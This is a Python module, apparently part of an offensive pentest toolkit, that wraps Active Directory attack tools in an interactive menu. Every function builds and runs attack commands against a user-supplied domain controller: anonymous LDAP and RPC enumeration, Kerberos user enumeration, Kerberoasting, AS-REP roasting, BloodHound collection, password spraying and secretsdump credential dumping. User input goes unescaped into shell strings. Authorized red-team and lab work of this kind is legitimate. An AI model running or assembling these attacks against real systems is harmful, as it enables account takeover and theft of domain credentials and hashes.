"""
Active Directory Tools - AD Enumeration and Attacks
"""

import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import *
from utils.helpers import *

class ADTools:
    def __init__(self):
        self.output_dir = create_output_dir("output/ad")
    
    def show_menu(self):
        while True:
            clear_screen()
            print(f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║              ACTIVE DIRECTORY TOOLS                          ║
╠══════════════════════════════════════════════════════════════╣{Colors.END}
║   {Colors.CYAN}[1]{Colors.END}  LDAP Enumeration                                   ║
║   {Colors.CYAN}[2]{Colors.END}  SMB Enumeration                                    ║
║   {Colors.CYAN}[3]{Colors.END}  Kerberoasting                                      ║
║   {Colors.CYAN}[4]{Colors.END}  AS-REP Roasting                                    ║
║   {Colors.CYAN}[5]{Colors.END}  BloodHound Collection                              ║
║   {Colors.CYAN}[6]{Colors.END}  RPC Enumeration                                    ║
║   {Colors.CYAN}[7]{Colors.END}  User Enumeration                                   ║
║   {Colors.CYAN}[8]{Colors.END}  Password Spray                                     ║
║   {Colors.CYAN}[9]{Colors.END}  Dump Secrets (secretsdump)                         ║
║   {Colors.RED}[0]{Colors.END}  Back                                               ║
{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.END}
            """)
            choice = get_input("  Select")
            if choice == "0": break
            elif choice == "1": self.ldap_enum()
            elif choice == "2": self.smb_enum()
            elif choice == "3": self.kerberoast()
            elif choice == "4": self.asrep_roast()
            elif choice == "5": self.bloodhound()
            elif choice == "6": self.rpc_enum()
            elif choice == "7": self.user_enum()
            elif choice == "8": self.password_spray()
            elif choice == "9": self.dump_secrets()

    def ldap_enum(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  LDAP ENUMERATION{Colors.END}\n")
        dc = get_input("  Domain Controller IP")
        domain = get_input("  Domain (e.g., corp.local)")
        
        if not dc: return
        
        base_dn = ",".join([f"DC={x}" for x in domain.split(".")])
        
        print_info("  Anonymous LDAP query...")
        cmd = f"ldapsearch -x -H ldap://{dc} -b '{base_dn}' '(objectClass=*)'"
        run_command_live(cmd + " 2>&1 | head -50")
        
        if check_tool("ldapdomaindump"):
            if confirm("\n  Run ldapdomaindump?"):
                user = get_input("  Username (DOMAIN\\user)")
                passwd = get_input("  Password")
                cmd = f"ldapdomaindump -u '{user}' -p '{passwd}' {dc} -o {self.output_dir}"
                run_command_live(cmd)
        
        input("\n  Press Enter...")

    def smb_enum(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  SMB ENUMERATION{Colors.END}\n")
        target = get_input("  Target IP")
        if not target: return
        
        print_info("  Running enum4linux...")
        if check_tool("enum4linux"):
            run_command_live(f"enum4linux -a {target} 2>&1 | head -100")
        
        print_info("\n  SMB shares (smbclient)...")
        run_command_live(f"smbclient -L //{target} -N 2>&1")
        
        if check_tool("crackmapexec"):
            print_info("\n  CrackMapExec...")
            run_command_live(f"crackmapexec smb {target}")
        
        input("\n  Press Enter...")

    def kerberoast(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  KERBEROASTING{Colors.END}\n")
        dc = get_input("  Domain Controller")
        domain = get_input("  Domain")
        user = get_input("  Username")
        passwd = get_input("  Password")
        
        if not all([dc, domain, user, passwd]): return
        
        outfile = f"{self.output_dir}/kerberoast_{get_timestamp()}.txt"
        
        if check_tool("GetUserSPNs.py"):
            cmd = f"GetUserSPNs.py {domain}/{user}:{passwd} -dc-ip {dc} -request -outputfile {outfile}"
            print_info(f"  {cmd}")
            run_command_live(cmd)
            print_success(f"  Hashes saved: {outfile}")
        elif check_tool("impacket-GetUserSPNs"):
            cmd = f"impacket-GetUserSPNs {domain}/{user}:{passwd} -dc-ip {dc} -request -outputfile {outfile}"
            run_command_live(cmd)
        else:
            print_error("  Impacket not found! apt install python3-impacket")
        
        input("\n  Press Enter...")

    def asrep_roast(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  AS-REP ROASTING{Colors.END}\n")
        dc = get_input("  Domain Controller")
        domain = get_input("  Domain")
        userlist = get_input("  User list file (or single user)")
        
        if not all([dc, domain, userlist]): return
        
        outfile = f"{self.output_dir}/asrep_{get_timestamp()}.txt"
        
        if check_tool("GetNPUsers.py"):
            if os.path.isfile(userlist):
                cmd = f"GetNPUsers.py {domain}/ -dc-ip {dc} -usersfile {userlist} -format hashcat -outputfile {outfile}"
            else:
                cmd = f"GetNPUsers.py {domain}/{userlist} -dc-ip {dc} -no-pass -format hashcat"
            print_info(f"  {cmd}")
            run_command_live(cmd)
        else:
            print_error("  Impacket not found!")
        
        input("\n  Press Enter...")

    def bloodhound(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  BLOODHOUND COLLECTION{Colors.END}\n")
        
        if not check_tool("bloodhound-python"):
            print_error("  bloodhound-python not found!")
            print_info("  pip3 install bloodhound")
            input("\n  Enter..."); return
        
        dc = get_input("  Domain Controller")
        domain = get_input("  Domain")
        user = get_input("  Username")
        passwd = get_input("  Password")
        
        cmd = f"bloodhound-python -u {user} -p '{passwd}' -d {domain} -dc {dc} -c All -ns {dc}"
        print_info(f"  {cmd}")
        run_command_live(cmd)
        print_success("  Import JSON files into BloodHound GUI")
        input("\n  Press Enter...")

    def rpc_enum(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  RPC ENUMERATION{Colors.END}\n")
        target = get_input("  Target IP")
        if not target: return
        
        print_info("  Null session RPC...")
        run_command_live(f"rpcclient -U '' -N {target} -c 'enumdomusers' 2>&1")
        
        print_info("\n  Domain info...")
        run_command_live(f"rpcclient -U '' -N {target} -c 'querydominfo' 2>&1")
        input("\n  Press Enter...")

    def user_enum(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  USER ENUMERATION{Colors.END}\n")
        dc = get_input("  Domain Controller")
        domain = get_input("  Domain")
        
        if check_tool("kerbrute"):
            userlist = get_input("  Username wordlist", "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")
            cmd = f"kerbrute userenum --dc {dc} -d {domain} {userlist}"
            run_command_live(cmd)
        else:
            print_warning("  kerbrute not found, using nmap...")
            run_command_live(f"nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='{domain}' {dc}")
        
        input("\n  Press Enter...")

    def password_spray(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  PASSWORD SPRAY{Colors.END}\n")
        print_warning("  Be careful - account lockouts possible!")
        
        dc = get_input("  Domain Controller")
        domain = get_input("  Domain")
        userlist = get_input("  User list file")
        password = get_input("  Password to spray")
        
        if check_tool("crackmapexec"):
            cmd = f"crackmapexec smb {dc} -u {userlist} -p '{password}' -d {domain}"
            run_command_live(cmd)
        elif check_tool("kerbrute"):
            cmd = f"kerbrute passwordspray --dc {dc} -d {domain} {userlist} '{password}'"
            run_command_live(cmd)
        else:
            print_error("  crackmapexec or kerbrute required!")
        
        input("\n  Press Enter...")

    def dump_secrets(self):
        clear_screen()
        print(f"\n{Colors.BOLD}  DUMP SECRETS{Colors.END}\n")
        target = get_input("  Target IP")
        domain = get_input("  Domain")
        user = get_input("  Admin username")
        passwd = get_input("  Password")
        
        outfile = f"{self.output_dir}/secrets_{get_timestamp()}.txt"
        
        if check_tool("secretsdump.py"):
            cmd = f"secretsdump.py {domain}/{user}:{passwd}@{target}"
            print_info(f"  {cmd}")
            stdout, _, _ = run_command(cmd)
            print(stdout[:1000])
            with open(outfile, 'w') as f: f.write(stdout)
            print_success(f"  Saved: {outfile}")
        else:
            print_error("  Impacket not found!")
        
        input("\n  Press Enter...")
